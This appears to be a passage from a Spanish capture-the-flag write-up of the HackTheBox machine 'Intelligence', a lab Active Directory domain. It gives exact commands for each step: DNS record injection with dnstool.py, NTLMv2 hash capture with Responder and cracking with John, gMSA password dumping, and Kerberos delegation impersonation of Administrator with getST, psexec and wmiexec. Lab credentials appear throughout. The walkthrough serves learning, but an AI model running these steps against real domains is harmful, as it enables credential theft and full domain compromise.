Pero para usarlos debemos contar con una cuenta que esté configurada para usar **Unconstrained Delegation**, o sea, que pueda hacer personificación. Para descubrirlo hay unas herramientas, pero ninguna me funciono, así que simplemente vayamos directo a probar cosas y ver si pasa algo.

Hay dos llamativas, pero sobre todo una (que embarca lo que estamos buscando probar):

* [krbrelayx/addspn.py](https://github.com/dirkjanm/krbrelayx/blob/master/addspn.py)
* [krbrelayx/dnspool.py](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py)

`addspn.py` es como la puerta de entrada para probar el del **DNS**, ya que con él validamos si tenemos los permisos necesarios para modificar cositas como `Tiffany`. 

Lo que hace el script es agregar un nuevo **SPN (Service Principal Name)** en la red (recordemos que queremos añadir un subdominio que inicie con `web`).

📡 ***SPN:*** *Es un -nombre- que un cliente usa para identificar una instancia de un servicio*. [SPNs in Active Directory](https://help.zaptechnology.com/zap%20cubexpress/currentversion/content/topics/HowTo/UsingSPN.htm).

```bash
❱ python3 addspn.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -s 'host/webclaroquesi.intelligence.htb' -t dc.intelligence.htb ldap://intelligence.htb
```

Pero en su ejecución nos indica:

```bash
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[!] Could not modify object, the server reports insufficient rights: 00002098: SecErr: DSID-03150F94, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
```

Básicamente, no tenemos permisos para modificar, esto nos hace dudar de si la explotación va por acá, pero aún tenemos el otro recurso, probémoslo para salir de dudas:

Con él agregamos un registro **DNS** al servidor, que es nuestra idea inicial, el añadir un subdominio con nombre `web...` y que apunte a nosotros, su ejecución es muy sencilla e intuitiva.

Le pasamos las credenciales, el subdominio a agregar (`webclaroquesi.intelligence.htb`) la dirección IP a la que debe resolver (`10.10.15.1`, la nuestra) y finalmente la dirección del servidor **DNS**:

```bash
❱ python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r webclaroquesi.intelligence.htb -a add -d 10.10.15.1 10.10.10.248
```

Obtenemos:

```bash
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

:o Parece que se realizó todo correctamente, por lo tanto, se tuvo que haber agregado el subdominio, podemos validarlo ejecutando la misma consulta que hace el script de `Ted`:

```bash
❱ ldapsearch -h 10.10.10.248 -D 'intelligence\Tiffany.Molina' -w 'NewIntelligenceCorpUser9876' -b "DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | grep web
# webclaroquesi, intelligence.htb, MicrosoftDNS, DomainDnsZones.intelligence.ht
dn: DC=webclaroquesi,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=
distinguishedName: DC=webclaroquesi,DC=intelligence.htb,CN=MicrosoftDNS,DC=Dom
name: webclaroquesi
dc: webclaroquesi
```

Opaaaaaaaaaa, si se creó el registro, por lo tanto, cada `5` minutos **Ted** va a hacer una petición al dominio `webclaroquesi.intelligence.htb` que resuelve a la IP `10.10.15.1`...

¿Cómo jugamos con esto? Muy sencillo, podemos hacer uso de la herramienta [Responder.py](https://github.com/lgandx/Responder) que entre muchas cosas, nos permite aprovechar un posicionamiento (que ya hicimos al agregar el nuevo subdominio que resuelve hacia nuestra IP) entre un cliente y un servidor que estén realizando autenticaciones (**Ted** esta usando sus credenciales para las peticiones) para capturar credenciales (en formato **hash `NTLM/NTLMv2`**) que nos puedan servir ya sea para personificar usuarios (**NTLM**) o intentar crackearlas (**NTLMv2**).

* [NTLM Relay](https://en.hackndo.com/ntlm-relay/).
* [NTLM Relay Attacks Explained](https://www.qomplx.com/qomplx-knowledge-ntlm-relay-attacks-explained/).

Pues pongámonos a escuchar todo lo que pase por la interfaz donde esta la VPN de HackTheBox (lo validas rápidamente con `ip a` o `ifconfig`):

```bash
❱ responder.py -I tun0
...
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357bash_responder_listening.png" style="width: 100%;"/>

Después de un tiempo, vemos estooooooooooooooooooooooooooooooo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357bash_responder_hashNTLMv2ted.png" style="width: 100%;"/>

Tamooooooooooooo, obtenemos el hash [NTLMv2](https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html) ([acá puedes ver y aprender como identificarlos](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)) del usuario `Ted.Graves`, como dije antes podemos intentar crackearlo, así que lo tomamos, lo guardamos en un archivo y jugamos con `John The Ripper` (o `Hashcat` o lo que seaaaaaaaaaa):

```bash
❱ john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 ted_ntlmv2.hash 
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357bash_JtR_tedNTLMv2_cracked.png" style="width: 100%;"/>

Perfectísimo, tenemos la contraseña en texto plano de **Ted** (: Ahora a investigar que podemos hacer con ella ¡qué lo cu ra!

Volvemos a tener acceso a las carpetas compartidas con **SMB**, lo nuevo es que claramente ya nos deja ver el directorio de **Ted** en `Users\`, pero no hay nada en su contenido...

...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Si recordamos lo único con lo que contamos es **LDAP** y **DNS** (que ya jugamos con ellos y obtuvimos lo que quisimos), unas credenciales únicamente válidas contra **SMB** y **LDAP** yyyyyyyyyyy el último **PDF** con algunas referencias que ya exploramos por encima antes, retomémoslas:

📁 ***Also, after discussion following our recent security audit we are in the process of locking down our service accounts.***

Jmm, después de la última auditoria están dando de baja a las **cuentas de servicio**... ¿Qué habrá pasado? ¿Qué son las cuentas de servicio? (ya lo hablamos antes, profundicemos un toque) Indaguemos...

* [Invisible Threats: Insecure Service Accounts](https://www.netspi.com/blog/technical/network-penetration-testing/invisible-threats-insecure-service-accounts/).

Según el anterior articulo (ta buenazo), básicamente son cuentas usadas para correr cualquier aplicación que se quiera/requiera, por ejemplo bases de datos, antivirus, mails, impresoras, etc. El temita es que muchas implementaciones son basadas en (también tomado del artículo), -lo configuramos y lo olvidamos-, o sea, lo necesitas, bueno, toma y ya, ahí queda. Esto lo que ocasiona es que muchas cuentas quedan configuradas con permisos excesivamente altos e innecesarios y claramente sin una monitorización o control.

¿Ya se va viendo hacia donde queremos ir?

Exacto, pueda que **Ted** tenga acceso a una cuenta de servicio, la cosa es validarlo...

Buscando como llevar a cabo ataques contra esas cuentas, llegamos a este repo:

* [PayloadAllTheThings - Reading GMSA Password](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#reading-gmsa-password).

Y nos deja esta cita:

🧾 ***User accounts created to be used as service accounts <u>rarely have their password changed</u>. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically changed.***

Lo que nos muestra es que podemos dumpear la contraseña de alguna cuenta de servicio que exista (claro, si es que tenemos permisos para hacerlo), para validar que grupos y usuarios del AD pueden verla, usaremos la herramienta [gMSADumper](https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py), que curiosamente fue creada por [Micah](https://github.com/micahvandeusen) (creador de esta máquina) y [xct](https://github.com/xct) (creador también de máquinas).

El uso es sencillo, ejecutémosla primero como `Tiffany` a ver si podíamos desde antes validar esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357bash_gMSADumper_Tiffany_groupsCANdump.png" style="width: 100%;"/>

Opa, vemos dos cosas, existe una cuenta de servicio llamada `svc_int` yyyyy únicamente pueden ver su contraseña los usuarios de los grupos `DC$` e `itsupport`, pues descubramos quienes están en el grupo `itsupport` (podemos pensar que claramente **Ted** esta, ya que el script fue creado por él y se hablaba que era para dar soporte al departamento de **IT**):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357bash_ldapsearch_Tiffany_itsupportGroupMembers.png" style="width: 100%;"/>

Como habíamos dicho, tenía sentido que existiera **Ted**, solo que también existe **Laura** en el grupo, pero como ya tenemos credenciales de **Ted** no entramos en pánico y nos disponemos a jugar con él.

* *(Podemos validar el grupo **Managed Service Accounts** también jugando con la misma consulta:*

  ```bash
  ❱ ldapsearch -h 10.10.10.248 -D 'intelligence\Tiffany.Molina' -w 'NewIntelligenceCorpUser9876' -b "DC=intelligence,DC=htb" | grep svc -A 20
  # svc_int, Managed Service Accounts, intelligence.htb
  dn: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
  ...
  sAMAccountName: svc_int$                                                                        
  ...
  dNSHostName: svc_int.intelligence.htb          
  objectCategory: CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
  ...
  msDS-AllowedToDelegateTo: WWW/dc.intelligence.htb
  ...
  ```

  **(<u>Spoiler: Ojito con la última línea, la necesitaremos ahorita</u>)**

  *Así que perfecto, sigamos)*

Veamos la contraseña de la cuenta `svc_int` aprovechando que estamos en uno de los grupos que pueden verla:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357bash_gMSADumper_Ted_svc-int_password.png" style="width: 100%;"/>

Listoones, ya la tenemos, llegados a este punto ¿pa que nos sirve esto? 

¿Recuerdas el pequeño spoiler de hace unas líneas? Y ¿recuerdas que ya habíamos hablado y explotado los <u>Delegation Attacks</u>? Pueeeeeeeeees podemos aprovechar la contraseña y el usuario obtenidos para personificar un usuario sobre el **SPN** `WWW/dc.intelligence.htb` 😵 Por ejemplo hacer de cuenta que no somos `svc_int` sino `Tiffany.Molina` o `Ted.Graves` oooooooooo `Administrator`, démosle:

* [Apoyados de **xct** - Group Managed Service Accounts (GMSA)](https://notes.vulndev.io/notes/misc/labs/group-managed-service-accounts-gmsa).

Lo primero claramente es obtener la contraseña y el usuario de la cuenta de servicio, ya lo tenemos.

Lo segundo es generar un [**Service Ticket**](https://www.tarlogic.com/es/blog/como-funciona-kerberos/) para lograr la personificación como otro usuario, esto presentándolo ante otros servicios para así acceder a sus recursos.

> Se tiene que cumplir que la cuenta permita la **delegación** (que ya vimos que si)

Usamos `getST.py`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357bash_getST_Administrator.png" style="width: 100%;"/>

Y ya tendríamos un ticket que nos permite interactuar con los servicios como el usuario `Administrator`:

```bash
❱ klist
Ticket cache: FILE:Administrator.ccache
Default principal: Administrator@intelligence.htb

Valid starting     Expires            Service principal
08/09/21 25:25:21  09/09/21 25:25:22  WWW/dc.intelligence.htb@INTELLIGENCE.HTB
       renew until 09/09/21 25:25:23
```

Por lo que podemos usar varias herramientas, como por ejemplo `psexec` para intentar obtener una **Terminal** o `wmiexec` también para lo mismo, peeero antes, configuremos una variable de nuestro entorno para que no nos pida contraseñas, sino que tome el ticket como si fueran las credenciales:

```bash
❱ export KRB5CCNAME=Administrator.ccache
```

Y ahora podríamos ejecutar:

```bash
❱ psexec.py intelligence.htb/Administrator@dc.intelligence.htb -k -no-pass
```

> (-k hace la autenticación por Kerberos (o sea, toma nuestro ticket))

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357bash_psexec_AdministratorCMD.png" style="width: 100%;"/>

Y también con `wmiexec`, la sintaxis es igual:

```bash
❱ wmiexec.py intelligence.htb/Administrator@dc.intelligence.htb -k -no-pass
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357bash_wmiexec_AdministratorCMD.png" style="width: 100%;"/>

Y listooooooooooooooos, tendríamos acceso al sistema como el usuario `Administrator`, por lo tanto, **podríamos hacer cu al qui er COSAAAAAAAAAAAA!!**

Veamos las flags:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357flags.png" style="width: 100%;"/>

...

Una escalada bastante desquiciada a mi parecer, pero no le quita que es un excelente máquina que juega con las -personificaciones- de una manera muy linda.

Espero les haya sido de ayuda tanto como a mí (esta máquina me costó bastante eh!) y nada, nos leeremos después, A ROMPER TODOOOOOOOOOOOOOOOOOOOOO!!